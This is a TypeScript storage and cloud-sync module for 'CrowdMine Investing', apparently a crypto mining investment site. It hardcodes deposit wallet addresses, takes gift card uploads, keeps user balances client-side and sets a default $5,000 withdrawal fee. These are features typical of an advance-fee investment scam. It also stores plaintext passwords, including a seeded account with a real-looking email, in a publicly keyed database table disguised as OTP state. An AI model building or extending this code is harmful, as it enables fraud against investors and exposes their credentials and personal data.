/**
 * CrowdMine Investing - Cloud Sync & Local Storage Service
 * Fully compatible with previous records and Supabase cloud persistence
 */
import { User, DepositRequest, WithdrawalRequest, GiftCardUpload, WalletAddresses } from '../types';

const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';
const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
const SYNC_ID = 2;
const SYNC_KEYS = ['ocio_users', 'ocio_deposits', 'ocio_withdrawals', 'ocio_wallet_addresses', 'ocio_giftcards'];

export const DEFAULT_WALLET_ADDRESSES: WalletAddresses = {
  btc: 'bc1qxn75r74yxn506avewznvleyg80epcvmaduunpv',
  eth: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060',
  sol: 'DSkxE7spkNuX26EwWHiGuPpq8eZXzFTzpFGxFbckHavi',
  usdt: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060',
  bnb: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F606'
};

export const DEFAULT_PRESEEDED_USER: User = {
  name: 'MarieDupre',
  email: 'petemariedunn@gmail.com',
  password: 'MarieDupre',
  withdrawalFee: 5000,
  balance: 270,
  joined: '5/24/2026',
  hashrate: '142.5 TH/s'
};

export function generateTxId(): string {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
}

// Cloud GET
export async function cloudFetch(): Promise<Record<string, any> | null> {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/otp_state?select=expectedOtp&id=eq.${SYNC_ID}`, {
      headers: {
        apikey: SUPABASE_KEY,
        Authorization: `Bearer ${SUPABASE_KEY}`,
        Accept: 'application/json'
      },
      cache: 'no-store'
    });
    if (res.ok) {
      const rows = await res.json();
      const val = rows && rows.length > 0 ? rows[0].expectedOtp : null;
      if (!val) return {};
      try {
        return JSON.parse(val);
      } catch {
        return {};
      }
    }
    return null;
  } catch (err) {
    console.warn('[CloudSync] Fetch failed:', err);
    return null;
  }
}

// Cloud PUT/POST
export async function cloudPush(data: Record<string, any>): Promise<boolean> {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/otp_state`, {
      method: 'POST',
      headers: {
        apikey: SUPABASE_KEY,
        Authorization: `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        Prefer: 'resolution=merge-duplicates'
      },
      body: JSON.stringify({ id: SYNC_ID, expectedOtp: JSON.stringify(data) })
    });
    return res.ok;
  } catch (err) {
    console.warn('[CloudSync] Push failed:', err);
    return false;
  }
}

export function getAllUsers(): User[] {
  try {
    const str = localStorage.getItem('ocio_users');
    let users: User[] = str ? JSON.parse(str) : [];
    if (!users || !Array.isArray(users) || users.length === 0) {
      users = [DEFAULT_PRESEEDED_USER];
      localStorage.setItem('ocio_users', JSON.stringify(users));
    }
    // Ensure MarieDupre is in the list
    if (!users.some(u => u.email.toLowerCase() === DEFAULT_PRESEEDED_USER.email.toLowerCase())) {
      users.push(DEFAULT_PRESEEDED_USER);
      localStorage.setItem('ocio_users', JSON.stringify(users));
    }
    return users;
  } catch {
    return [DEFAULT_PRESEEDED_USER];
  }
}

export function saveAllUsers(users: User[]) {
  const valid = users.filter(u => u && u.email);
  localStorage.setItem('ocio_users', JSON.stringify(valid));
  pushAllDataToCloud();
}

export function getCurrentUser(): User | null {
  try {
    const str = localStorage.getItem('ocio_user');
    if (!str) return null;
    return JSON.parse(str);
  } catch {
    return null;
  }
}

export function setCurrentUser(user: User | null) {
  if (user) {
    localStorage.setItem('ocio_user', JSON.stringify(user));
    localStorage.setItem('ocio_logged_in', 'true');
    const users = getAllUsers();
    const idx = users.findIndex(u => u.email.toLowerCase() === user.email.toLowerCase());
    if (idx >= 0) {
      users[idx] = { ...users[idx], ...user };
    } else {
      users.push(user);
    }
    localStorage.setItem('ocio_users', JSON.stringify(users));
  } else {
    localStorage.removeItem('ocio_user');
    localStorage.removeItem('ocio_logged_in');
  }
}

export function getUserBalance(email: string): number {
  const users = getAllUsers();
  const u = users.find(u => u.email.toLowerCase() === email.toLowerCase());
  return u ? (u.balance || 0) : 0;
}

export function getUserWithdrawalFee(email: string): number {
  const users = getAllUsers();
  const u = users.find(u => u.email.toLowerCase() === email.toLowerCase());
  return u && u.withdrawalFee !== undefined ? u.withdrawalFee : 5000;
}

export function getAllDeposits(): DepositRequest[] {
  try {
    const str = localStorage.getItem('ocio_deposits');
    return str ? JSON.parse(str) : [];
  } catch {
    return [];
  }
}

export function saveDeposits(deps: DepositRequest[]) {
  localStorage.setItem('ocio_deposits', JSON.stringify(deps));
  pushAllDataToCloud();
}

export function getAllWithdrawals(): WithdrawalRequest[] {
  try {
    const str = localStorage.getItem('ocio_withdrawals');
    return str ? JSON.parse(str) : [];
  } catch {
    return [];
  }
}

export function saveWithdrawals(wds: WithdrawalRequest[]) {
  localStorage.setItem('ocio_withdrawals', JSON.stringify(wds));
  pushAllDataToCloud();
}

export function getAllGiftcards(): GiftCardUpload[] {
  try {
    const str = localStorage.getItem('ocio_giftcards');
    return str ? JSON.parse(str) : [];
  } catch {
    return [];
  }
}

export function saveGiftcards(gcs: GiftCardUpload[]) {
  localStorage.setItem('ocio_giftcards', JSON.stringify(gcs));
  pushAllDataToCloud();
}

export function getWalletAddresses(): WalletAddresses {
  try {
    const str = localStorage.getItem('ocio_wallet_addresses');
    if (str) {
      const parsed = JSON.parse(str);
      return { ...DEFAULT_WALLET_ADDRESSES, ...parsed };
    }
    return DEFAULT_WALLET_ADDRESSES;
  } catch {
    return DEFAULT_WALLET_ADDRESSES;
  }
}

export function saveWalletAddresses(addrs: WalletAddresses) {
  localStorage.setItem('ocio_wallet_addresses', JSON.stringify(addrs));
  pushAllDataToCloud();
}

export async function pushAllDataToCloud(): Promise<boolean> {
  const payload: Record<string, any> = {
    ocio_users: getAllUsers(),
    ocio_deposits: getAllDeposits(),
    ocio_withdrawals: getAllWithdrawals(),
    ocio_giftcards: getAllGiftcards(),
    ocio_wallet_addresses: getWalletAddresses()
  };
  return await cloudPush(payload);
}

export async function cloudSyncFull(): Promise<boolean> {
  const cloudData = await cloudFetch();
  if (!cloudData) return false;

  let changed = false;

  // Sync users
  if (Array.isArray(cloudData.ocio_users) && cloudData.ocio_users.length > 0) {
    const localUsers = getAllUsers();
    const map = new Map<string, User>();
    cloudData.ocio_users.forEach((u: User) => {
      if (u && u.email) map.set(u.email.toLowerCase(), u);
    });
    localUsers.forEach(u => {
      if (u && u.email && !map.has(u.email.toLowerCase())) {
        map.set(u.email.toLowerCase(), u);
      }
    });
    const merged = Array.from(map.values());
    localStorage.setItem('ocio_users', JSON.stringify(merged));
    changed = true;
  }

  // Sync deposits
  if (Array.isArray(cloudData.ocio_deposits)) {
    const localDeps = getAllDeposits();
    const depMap = new Map<string, DepositRequest>();
    cloudData.ocio_deposits.forEach((d: DepositRequest) => {
      if (d && d.id) depMap.set(d.id, d);
    });
    localDeps.forEach(d => {
      if (d && d.id && !depMap.has(d.id)) {
        depMap.set(d.id, d);
      }
    });
    localStorage.setItem('ocio_deposits', JSON.stringify(Array.from(depMap.values())));
  }

  // Sync withdrawals
  if (Array.isArray(cloudData.ocio_withdrawals)) {
    const localWds = getAllWithdrawals();
    const wdMap = new Map<string, WithdrawalRequest>();
    cloudData.ocio_withdrawals.forEach((w: WithdrawalRequest) => {
      if (w && w.id) wdMap.set(w.id, w);
    });
    localWds.forEach(w => {
      if (w && w.id && !wdMap.has(w.id)) {
        wdMap.set(w.id, w);
      }
    });
    localStorage.setItem('ocio_withdrawals', JSON.stringify(Array.from(wdMap.values())));
  }

  // Sync wallet addresses
  if (cloudData.ocio_wallet_addresses && typeof cloudData.ocio_wallet_addresses === 'object') {
    const mergedAddrs = { ...DEFAULT_WALLET_ADDRESSES, ...cloudData.ocio_wallet_addresses };
    localStorage.setItem('ocio_wallet_addresses', JSON.stringify(mergedAddrs));
  }

  // Refresh current user session
  const current = getCurrentUser();
  if (current) {
    const allUsers = getAllUsers();
    const fresh = allUsers.find(u => u.email.toLowerCase() === current.email.toLowerCase());
    if (fresh) {
      localStorage.setItem('ocio_user', JSON.stringify(fresh));
    }
  }

  return changed;
}
